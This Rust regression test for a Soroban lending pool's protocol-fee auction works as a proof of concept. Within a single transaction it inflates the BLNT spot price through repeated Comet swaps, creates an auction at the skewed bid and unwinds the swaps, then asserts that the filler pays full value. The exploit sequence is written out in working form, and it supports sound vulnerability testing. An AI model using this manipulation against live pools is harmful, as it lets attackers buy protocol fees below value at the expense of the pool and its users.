#![cfg(test)]
#![allow(clippy::zero_prefixed_literal)]

use pool::{AuctionType, PoolDataKey, Request, RequestType};
use soroban_sdk::{
    contracttype,
    testutils::{Address as _, Ledger},
    vec, Address, Env,
};
use test_suites::{
    create_fixture_with_data,
    test_fixture::{TokenIndex, SCALAR_7},
};

#[derive(Clone, Debug, Eq, PartialEq)]
#[contracttype]
struct ProtocolFeeDataView {
    credit: i128,
    carry: i128,
}

fn protocol_fee_data(e: &Env, pool: &Address, asset: &Address) -> ProtocolFeeDataView {
    e.as_contract(pool, || {
        e.storage()
            .persistent()
            .get::<PoolDataKey, soroban_sdk::Map<Address, ProtocolFeeDataView>>(
                &PoolDataKey::ProtocolFees,
            )
            .and_then(|data| data.get(asset.clone()))
            .unwrap_or(ProtocolFeeDataView {
                credit: 0,
                carry: 0,
            })
    })
}

fn set_protocol_fee_data(e: &Env, pool: &Address, asset: &Address, data: ProtocolFeeDataView) {
    e.as_contract(pool, || {
        let mut fees = e
            .storage()
            .persistent()
            .get::<PoolDataKey, soroban_sdk::Map<Address, ProtocolFeeDataView>>(
                &PoolDataKey::ProtocolFees,
            )
            .unwrap_or_else(|| soroban_sdk::Map::new(e));
        fees.set(asset.clone(), data);
        e.storage()
            .persistent()
            .set(&PoolDataKey::ProtocolFees, &fees);
    })
}

/// Regression: a protocol-fee lot must not be sellable below its value.
///
/// The BLNT bid is quoted from a spot Comet read and never revalidated at
/// fill, so a single-transaction swap-create-unwind leaves a permanently
/// discounted bid on a full-value lot. This test drives that sequence and
/// asserts the filler burns BLNT worth the lot, so it fails while the bug
/// is present and passes once the quote is made manipulation-resistant or
/// revalidated at fill.
#[test]
fn poc_protocol_fee_bid_frozen_at_manipulated_spot() {
    let fixture = create_fixture_with_data(false);
    let e = fixture.env.clone();
    let pool = &fixture.pools[0].pool;
    let stable = &fixture.tokens[TokenIndex::STABLE];
    let stable_address = stable.address.clone();
    let blnt = &fixture.tokens[TokenIndex::BLNT];
    let usdc = &fixture.tokens[TokenIndex::USDC];
    let attacker = fixture.users[0].clone();

    // Install an exact $200 protocol-credit lot.
    stable.mint(&pool.address, &1);
    assert_eq!(pool.gulp(&stable_address), 1);
    let mut fee = protocol_fee_data(&e, &pool.address, &stable_address);
    let target_credit = 200 * 10i128.pow(6);
    assert!(fee.credit <= target_credit);
    stable.mint(&pool.address, &(target_credit - fee.credit));
    fee.credit = target_credit;
    set_protocol_fee_data(&e, &pool.address, &stable_address, fee);

    fixture
        .oracle
        .set_price_stable(&vec![&e, 2000_0000000, 1_0000000, 0_1000000, 1_0000000]);

    let honest_price = fixture.backstop.blnt_price();
    let blnt_r0 = fixture.lp.get_balance(&blnt.address);
    let usdc_r0 = fixture.lp.get_balance(&usdc.address);
    std::println!("honest blnt_price = {}", honest_price);
    std::println!("reserves before: blnt={} usdc={}", blnt_r0, usdc_r0);

    // --- single transaction begins ---
    // Step 1: swap USDC in / BLNT out to inflate usdc_reserve and deflate
    // blnt_reserve, i.e. inflate the reported BLNT spot price.
    // Comet caps a single swap at 1/3 of the in-reserve (ErrMaxInRatio), so
    // the attacker compounds several swaps inside the same transaction.
    usdc.mint(&attacker, &(10_000_000 * SCALAR_7));
    let attacker_usdc_before = usdc.balance(&attacker);
    let attacker_blnt_before = blnt.balance(&attacker);
    for _ in 0..4 {
        let reserve = fixture.lp.get_balance(&usdc.address);
        let amt = reserve / 4;
        fixture.lp.swap_exact_amount_in(
            &usdc.address,
            &amt,
            &blnt.address,
            &0,
            &i128::MAX,
            &attacker,
        );
    }
    let skewed_price = fixture.backstop.blnt_price();
    std::println!(
        "skewed blnt_price = {} ({}x)",
        skewed_price,
        skewed_price / honest_price
    );

    // Step 2: create the auction at the skewed quote.
    let auction = pool.new_auction(
        &(AuctionType::ProtocolFeeAuction as u32),
        &fixture.backstop.address,
        &vec![&e],
        &vec![&e, stable_address.clone()],
        &100,
    );
    let skewed_bid = auction.bid.get(blnt.address.clone()).unwrap();

    // Step 3: unwind the swap.
    let mut blnt_left = blnt.balance(&attacker) - attacker_blnt_before;
    while blnt_left > 0 {
        let reserve = fixture.lp.get_balance(&blnt.address);
        let amt = core::cmp::min(blnt_left, reserve / 4);
        if amt == 0 {
            break;
        }
        fixture.lp.swap_exact_amount_in(
            &blnt.address,
            &amt,
            &usdc.address,
            &0,
            &i128::MAX,
            &attacker,
        );
        blnt_left -= amt;
    }
    // --- single transaction ends ---

    let restored_price = fixture.backstop.blnt_price();
    let round_trip_cost = attacker_usdc_before - usdc.balance(&attacker);
    std::println!("restored blnt_price = {}", restored_price);
    std::println!("round-trip USDC cost = {}", round_trip_cost);

    // The honest bid for the same lot, quoted at the restored price. This
    // mirrors what `create_protocol_fee_auction_data` computes:
    //   ceil(ceil(lot_value * 6 / 5) * SCALAR_7 / blnt_price)
    let honest_bid = (target_credit * 10i128.pow(1) * 6 / 5) * SCALAR_7 / restored_price;
    std::println!("skewed bid = {} BLNT", skewed_bid);
    std::println!("honest bid ~= {} BLNT", honest_bid);

    // The stored quote is what the filler settles against.
    let stored = pool.get_auction(
        &(AuctionType::ProtocolFeeAuction as u32),
        &fixture.backstop.address,
    );
    assert_eq!(stored.bid.get(blnt.address.clone()).unwrap(), skewed_bid);

    // Fill the whole lot at par, 200 ledgers on. Fund the filler for the
    // honest bid so the fill succeeds either way: whether the quote is
    // corrected at creation time or revalidated here at fill time.
    let filler = Address::generate(&e);
    blnt.mint(&filler, &(honest_bid * 2));
    let filler_blnt_before = blnt.balance(&filler);
    let filler_stable_before = stable.balance(&filler);
    e.ledger().set_sequence_number(stored.block + 200);
    pool.submit(
        &filler,
        &filler,
        &filler,
        &vec![
            &e,
            Request {
                request_type: RequestType::FillProtocolFeeAuction as u32,
                address: fixture.backstop.address.clone(),
                amount: 100,
            },
        ],
    );

    let blnt_paid = filler_blnt_before - blnt.balance(&filler);
    let stable_taken = stable.balance(&filler) - filler_stable_before;
    std::println!("filler took {} STABLE for {} BLNT", stable_taken, blnt_paid);

    assert_eq!(stable_taken, target_credit, "filler took the full lot");

    // The invariant: a filler taking the full lot must burn BLNT worth that
    // lot at an unmanipulated price. Either fix satisfies it -- quoting the
    // bid from a manipulation-resistant price, or revalidating the frozen
    // quote at fill. While the bid stays frozen at the manipulated spot
    // read, this assertion fails.
    assert!(
        blnt_paid >= honest_bid * 98 / 100,
        "protocol-fee lot sold below value: filler burned {} BLNT for a lot worth {} BLNT \
         (bid quoted at a spot BLNT price of {}, never revalidated against {})",
        blnt_paid,
        honest_bid,
        skewed_price,
        restored_price
    );
}
